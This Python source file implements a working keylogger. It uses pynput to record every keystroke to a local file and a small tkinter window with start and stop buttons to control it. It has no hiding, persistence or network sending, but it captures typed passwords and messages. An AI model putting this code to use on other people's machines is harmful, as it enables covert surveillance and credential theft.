import threading
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox

class KeyLogger:
    def __init__(self, filename="keylogs.txt"):
        self.filename = filename
        self.listener = None
        self.is_listening = False

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return f'[{key}]'

    def on_press(self, key):
        with open(self.filename, 'a') as log_file:
            log_file.write(self.get_char(key) + '\n')

    def start_logging(self):
        if not self.is_listening:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.is_listening = True

    def stop_logging(self):
        if self.listener and self.is_listening:
            self.listener.stop()
            self.is_listening = False

class KeyLoggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger GUI")
        self.root.geometry("300x150")
        self.root.resizable(False, False)

        self.logger = KeyLogger()

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging, bg="green", fg="white")
        self.start_button.pack(pady=20)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, bg="red", fg="white")
        self.stop_button.pack()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def start_logging(self):
        threading.Thread(target=self.logger.start_logging, daemon=True).start()
        messagebox.showinfo("Keylogger", "Keylogging started.")

    def stop_logging(self):
        self.logger.stop_logging()
        messagebox.showinfo("Keylogger", "Keylogging stopped.")

    def on_closing(self):
        self.logger.stop_logging()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerGUI(root)
    root.mainloop()
